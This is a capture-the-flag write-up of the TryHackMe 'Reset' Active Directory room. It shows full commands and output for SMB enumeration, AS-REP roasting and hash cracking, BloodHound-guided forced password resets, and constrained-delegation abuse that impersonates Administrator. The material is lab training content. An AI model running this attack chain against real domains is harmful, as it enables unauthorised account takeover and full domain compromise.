---
layout: post
title:  "Reset (TryHackMe) Writeup"
date:   2026-01-27 13:00:00 +0530
categories: [TryHackMe, Active Directory]
---

Reset is a Windows Active Directory room on TryHackMe that focuses on identifying and abusing misconfigured domain permissions. The room introduces concepts such as BloodHound enumeration, password reset abuse, and delegation misconfigurations to move laterally between users.


**TryHackMe Room**: [Reset](https://tryhackme.com/room/resetui)

## Enumeration 

Starting with the nmap scan . 

```
nmap -p 1-10000 -sCV -O -T4 10.48.160.56
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 18:04 IST
Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 78.57% done; ETC: 18:06 (0:00:05 remaining)
Nmap scan report for 10.48.160.56
Host is up (0.37s latency).
Not shown: 9986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 12:34:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-25T12:35:51+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2026-01-24T12:29:45
|_Not valid after:  2026-07-26T12:29:45
|_ssl-date: 2026-01-25T12:36:30+00:00; -1m48s from scanner time.
7680/tcp open  pando-pub?
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Windows Server 2019 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-25T12:35:54
|_  start_date: N/A
|_clock-skew: mean: -1m48s, deviation: 0s, median: -1m48s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.23 seconds
```

The result showed that the target is a Windows Active Directory Domain Controller. The domain was identified as **thm.corp** with the hostname **HAYSTACK**.


## SMB Enumeration

Next, I enumerated SMB shares using the guest account.

```
❯ enum4linux -u thm.corp\\guest -a 10.48.160.56

do_connect: Connection to 10.48.160.56 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                             

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.48.160.56                                                                                                                        
                                                                                                                                                                    
//10.48.160.56/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                   
//10.48.160.56/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.48.160.56/Data     Mapping: OK Listing: OK Writing: N/A

```

I was able to access the **Data** share. Inside it, I found an **onboarding** directory containing a few PDF files and a text file. I downloaded the files to check if they contained any useful information inside them.

```
❯ smbclient //10.48.160.56/DATA -U thm.corp\\guest

Password for [THM.CORP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 19 14:10:57 2023
  ..                                  D        0  Wed Jul 19 14:10:57 2023
  onboarding                          D        0  Sun Jan 25 18:28:07 2026

                7863807 blocks of size 4096. 3001273 blocks available
smb: \> get onboarding
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \onboarding
smb: \> cd onboarding
smb: \onboarding\> ls
  .                                   D        0  Sun Jan 25 18:28:37 2026
  ..                                  D        0  Sun Jan 25 18:28:37 2026
  ap3wx0a4.1uk.pdf                    A  4700896  Mon Jul 17 13:41:53 2023
  j2odtgvz.0sm.pdf                    A  3032659  Mon Jul 17 13:42:09 2023
  yltxrvom.tfm.txt                    A      521  Mon Aug 21 23:51:59 2023

                7863807 blocks of size 4096. 3001225 blocks available
                
smb: \onboarding\> prompt off
smb: \onboarding\> recurse off
smb: \onboarding\> mget *
getting file \onboarding\bf2aheka.jio.pdf of size 3032659 as bf2aheka.jio.pdf (885.9 KiloBytes/sec) (average 885.9 KiloBytes/sec)
getting file \onboarding\kgvnu0f5.jrd.pdf of size 4700896 as kgvnu0f5.jrd.pdf (1359.4 KiloBytes/sec) (average 1123.9 KiloBytes/sec)
getting file \onboarding\ktyonsif.mcr.txt of size 521 as ktyonsif.mcr.txt (0.2 KiloBytes/sec) (average 861.5 KiloBytes/sec)
smb: \onboarding\> exit

```

From these files, I was able to get my hands on a **username and a password** that were shared as part of the onboarding process.

```
❯ cat ktyonsif.mcr.txt
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team%
```
.
```
❯ cat bf2aheka.jio.txt
The Art of
Effective User
Onboarding


Introduction
In this presentation, we will explore the
importance of user onboarding and how
it can impact your business. We'll discuss
key strategies, best practices, and realworld examples to help you create a
seamless onboarding experience.


Understanding User Onboarding
User onboarding is the process of guiding
new users to become successful and
engaged customers. It involves providing
clear instructions, valuable information,
and intuitive interface design. A wellexecuted onboarding experience can
reduce churn rate and increase user
satisfaction, leading to long-term
success.


Key Components of Onboarding
A successful onboarding experience
comprises several key components:
welcome messages, tutorials and guides,
progress indicators, personalization, and
feedback loops. Each component plays a
crucial role in helping users understand
your product, feel supported, and achieve
their goals efficiently.


Best Practices for Onboarding
To create an effective onboarding
process, keep these best practices in
mind: keep it simple, provide context,
offer interactive elements, focus on value,
use visual cues, and continuously
improve. By following these practices, you
can optimize user engagement and
retention.


Real-World Examples
Let's explore some inspiring real-world
examples of effective user onboarding. We'll
analyze how companies like Slack, Trello, and
Spotify have successfully implemented
onboarding strategies to deliver a smooth and
delightful user experience.


Example Email
Subject: Welcome to Reset Dear LILY ONEILL,
Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login
information to access your company account. Please keep this information confidential and do not share it with anyone.
The initial passowrd is: ResetMe123!
We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in
your new role.Best regards,
The Reset Team


Conclusion
In conclusion, effective user onboarding is a critical
factor in achieving user satisfaction, reducing churn,
and driving business success. By implementing the
strategies and best practices discussed in this
presentation, you can create a seamless onboarding
experience that sets your users up for long-term
success.


Thanks
Do you have any
questions?



```

```
name :        LILY ONEILL
passwordd:    ResetMe123!
```

```
❯ cat kgvnu0f5.jrd.txt
Navigating Company Policies:
Understanding Guidelines and
Examples


Introduction
Navigating Company Policies:
Understanding Guidelines and Examples


Why Policies Matter
Company policies provide structure and
guidance for employees. They ensure
consistency and compliance with legal
and ethical standards. Understanding
policies helps maintain a positive work
environment and reduces risks for both
employees and the organization.


Types of Company Policies
There are several types of company
policies including code of conduct, antidiscrimination, confidentiality,
attendance, internet and social media,
and dress code policies. Each policy serves
a specific purpose and helps maintain a
professional and productive workplace.


Key Elements of Policies
Company policies typically include
purpose, scope, responsibilities,
procedures, and consequences.
Understanding these elements is crucial
for employees to know what is expected of
them and the potential consequences of
policy violations.


Examples of Policy Violations
Policy violations can include harassment,
unauthorized disclosure of confidential
information, excessive absenteeism,
inappropriate internet usage, and dress
code violations. Understanding these
examples helps employees avoid common
pitfalls and maintain a professional
image.


Conclusion
Navigating company policies is essential
for employees to maintain a productive
and ethical work environment.
Understanding the purpose, scope, and
key elements of policies helps employees
make informed decisions and avoid policy
violations. By adhering to company
policies, employees contribute to the
overall success of the organization.


Thanks

```

I first tried authenticating using the credentials found for **LILY_ONEILL**, but unfortunately, they didn’t work. So with guest access , I used `impacket-lookupsid` to enumerate domain users and groups.

```
❯ impacket-lookupsid thm.corp/guest@10.48.160.56
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.48.160.56
[*] StringBinding ncacn_np:10.48.160.56[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
513: THM\Domain Users (SidTypeGroup)
514: THM\Domain Guests (SidTypeGroup)
515: THM\Domain Computers (SidTypeGroup)
516: THM\Domain Controllers (SidTypeGroup)
517: THM\Cert Publishers (SidTypeAlias)
518: THM\Schema Admins (SidTypeGroup)
519: THM\Enterprise Admins (SidTypeGroup)
520: THM\Group Policy Creator Owners (SidTypeGroup)
521: THM\Read-only Domain Controllers (SidTypeGroup)
522: THM\Cloneable Domain Controllers (SidTypeGroup)
525: THM\Protected Users (SidTypeGroup)
526: THM\Key Admins (SidTypeGroup)
527: THM\Enterprise Key Admins (SidTypeGroup)
553: THM\RAS and IAS Servers (SidTypeAlias)
571: THM\Allowed RODC Password Replication Group (SidTypeAlias)
572: THM\Denied RODC Password Replication Group (SidTypeAlias)
1008: THM\HAYSTACK$ (SidTypeUser)
1109: THM\DnsAdmins (SidTypeAlias)
1110: THM\DnsUpdateProxy (SidTypeGroup)
1111: THM\3091731410SA (SidTypeUser)
1112: THM\ERNESTO_SILVA (SidTypeUser)
1113: THM\TRACY_CARVER (SidTypeUser)
1114: THM\SHAWNA_BRAY (SidTypeUser)
1115: THM\CECILE_WONG (SidTypeUser)
1116: THM\CYRUS_WHITEHEAD (SidTypeUser)
1117: THM\DEANNE_WASHINGTON (SidTypeUser)
1118: THM\ELLIOT_CHARLES (SidTypeUser)
1119: THM\MICHEL_ROBINSON (SidTypeUser)
1120: THM\MITCHELL_SHAW (SidTypeUser)
1121: THM\FANNY_ALLISON (SidTypeUser)
1122: THM\JULIANNE_HOWE (SidTypeUser)
1123: THM\ROSLYN_MATHIS (SidTypeUser)
1124: THM\DANIEL_CHRISTENSEN (SidTypeUser)
1125: THM\MARCELINO_BALLARD (SidTypeUser)
1126: THM\CRUZ_HALL (SidTypeUser)
1127: THM\HOWARD_PAGE (SidTypeUser)
1128: THM\STEWART_SANTANA (SidTypeUser)
1130: THM\LINDSAY_SCHULTZ (SidTypeUser)
1131: THM\TABATHA_BRITT (SidTypeUser)
1132: THM\RICO_PEARSON (SidTypeUser)
1133: THM\DARLA_WINTERS (SidTypeUser)
1134: THM\ANDY_BLACKWELL (SidTypeUser)
1135: THM\LILY_ONEILL (SidTypeUser)
1136: THM\CHERYL_MULLINS (SidTypeUser)
1137: THM\LETHA_MAYO (SidTypeUser)
1138: THM\HORACE_BOYLE (SidTypeUser)
1139: THM\CHRISTINA_MCCORMICK (SidTypeUser)
1141: THM\3811465497SA (SidTypeUser)
1142: THM\MORGAN_SELLERS (SidTypeUser)
1143: THM\MARION_CLAY (SidTypeUser)
1144: THM\3966486072SA (SidTypeUser)
1146: THM\TED_JACOBSON (SidTypeUser)
1147: THM\AUGUSTA_HAMILTON (SidTypeUser)
1148: THM\TREVOR_MELTON (SidTypeUser)
1149: THM\LEANN_LONG (SidTypeUser)
1150: THM\RAQUEL_BENSON (SidTypeUser)
1151: THM\AN-173-distlist1 (SidTypeGroup)
1152: THM\Gu-gerardway-distlist1 (SidTypeGroup)
1154: THM\CH-ecu-distlist1 (SidTypeGroup)
1156: THM\AUTOMATE (SidTypeUser)

```

I created a list of valid users discovered earlier called `user.txt` and used it to perform **AS-REP Roasting** against the domain.

```
❯ GetNPUsers.py thm.corp/ \
  -dc-ip 10.48.160.56 \
  -usersfile clean_users.txt \
  -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HAYSTACK$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3091731410SA doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:848a5610e5e2b891c6644ebd8a4caf75$1435541c6f3103cc62c14202526b71ad142f01f6bb5ab2f8c02ae506fb88abf59fbe3d9018e955a5ddd8a5fefc7e51eff5bd3f400ab5ba92dd4cf8db16b96f9358aec7129e93871dcd774ca47e24207582187f86a7c0fec797651421d243cdb1c03f809dff230f32ade1fd6f10d63514d8a9edc34a844238bfe51ce3a91a2edbd0f9458df429d912a74b89b0308431470a4cd134b2e255a2be770265fd0dec907c16faf19e07fbe0ddb18fc7a7b35b5dc9670b82d394dcf7ab23d95f55500321173afe284cafc1993cfa68b0dcd9d0cead5a3e6e44f8a9a6c84f01950e32fc9b9d79adbe
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$TABATHA_BRITT@THM.CORP:6420b31cb824b14f135978e49dd7a657$f677e581b718f51dfcf4c3c637a853dc5df6ac69b42fb676b7d99c8c8e86fc1a4f12f1c0f8932367932a17b2488b85c2d7b93dc6672c126f809854abe31196f59ebecb9f95842367168d8d08459673a5b127c512280c6765116f3872c5aa343d01d22bb2a548c67359efc43d7a2bc00fc12d67b1b5bba3146803c2c6448b08aedd07c5d26ee46bd7c0492ac09ad48767209faa732f7420e8d30b7f94764ac2ea97f719f2e5465926872fb6bdae3e2262c5d5692c816b74b76ae89c002b762f4c792acbd2f05db1d989fd6736b64bef7b6737a956026a456c9d9e59d0e7fa6e8e917b2466
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3811465497SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User 3966486072SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$LEANN_LONG@THM.CORP:b4d2224e9d11a7ef0997d5926e1b0aa6$2d5e2d4344baee5e92dc5d0a1fc89a3ceea0c416a08ba8af22486fcc103ee850420f16d0b7afca3245fb1d773167aa286b2b0b71dc0851e672793c4a36296fad9b1b94673a0671e1a204bd9647f4b63a8793edb908f3f3dcc38dcf6d9dbeba6284765c2beffa8b666c77aa94ea6505d9a0c7de12ee140828ad615512b6ef51bdae355e2d23abb385b9307938ede24931a26ecd20174dbb682eabacbfa85f059d8a3289d904bc257fb71bea5977c9d08d10f618419f958f5a1992b0ec704ce7866c442b9686dca43b9ee9db94f97ba4cccfd0f7172d11d353ec02c264a4def1d873161003
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set


```

From this, I was able to retrieve AS-REP hashes for three users: **ERNESTO_SILVA**, **TABATHA_BRITT**, and **LEANN_LONG**.  
The next step was to crack these hashes. I used **hashcat**, and I was only able to crack the hash for **TABATHA_BRITT**.

```
❯ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

```

```
user : TABATHA_BRITT@THM.CORP
password:marlboro(1985)
```

## Enumeration w/ bloodhound

With valid credentials for **TABATHA_BRITT**, I ran bloodhound-python to collect information about the AD environment.

```
❯ bloodhound-python \                                 
  -u TABATHA_BRITT \
  -p 'marlboro(1985)' \
  -d thm.corp \
  -ns 10.48.160.56 \
  -c All
```

After importing the data into BloodHound and analyzing the graphs, a few interesting relationships stood out.

First, **TABATHA_BRITT** had high privileges over multiple users and groups. Most importantly,  TABATHA_BRITT had **ForceChangePassword / GenericAll** rights over **SHAWNA_BRAY**, meaning her password could be reset without knowing the original one.

![](/assets/image/reset/bloodhound1.png)

Further analysis showed that **SHAWNA_BRAY** had **WriteAccountRestrictions** and **ForceChangePassword** rights over **CRUZ_HALL**. This allowed another password reset and  **CRUZ_HALL** had ownership and **GenericWrite** permissions over **DARLA_WINTERS**, making it possible to take control of the DARLA_WINTERS account.

![](/assets/image/reset/bloodhound2.png)

Finally, **DARLA_WINTERS** was marked as **AllowedToDelegate** to the computer account **HAYSTACK.thm.corp**. This delegation misconfiguration allowed Kerberos impersonation of higher-privileged users.

![](/assets/image/reset/bloodhound3.png)


## Privilege Escalation

First, using **TABATHA_BRITT**, I reset the password for **SHAWNA_BRAY** and then the rest of the users.

```
❯ net rpc password 'SHAWNA_BRAY' 'P@ssw0rd123' \
-U 'THM'/'TABATHA_BRITT'%'marlboro(1985)' \
-S 110.48.160.56

```

```
user :     SHAWNA_BRAY
password:   P@ssw0rd123

user :     CRUZ_HALL
password:   Password@321

user: DARLA_WINTERS
password: Password@678
```

Since **DARLA_WINTERS** was allowed to delegate to **HAYSTACK.thm.corp**, I abused this misconfiguration to impersonate the **Administrator** account.

```
❯ getST.py thm.corp/DARLA_WINTERS:'Password@678' \
-spn cifs/HAYSTACK.thm.corp \
-impersonate Administrator \
-dc-ip 10.48.160.56

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache

```

This generated a Kerberos service ticket for **Administrator** and then export the ticket.

```
export KRB5CCNAME=Administrator@cifs_HAYSTACK.thm.corp@THM.CORP.ccache
```

Now that the Administrator ticket is loaded, the next step is to access the target as Administrator without a password.

```
impacket-wmiexec -k -no-pass Administrator@haystack.thm.corp
```

In the end, I grabbed the **root flag** from the Administrator’s desktop, and the **user flag** from the **AUTOMATE** user’s desktop.

```
THM{R*_**_R*_***_A**_D*******}

THM{A*********_***_R******_U*}  
```
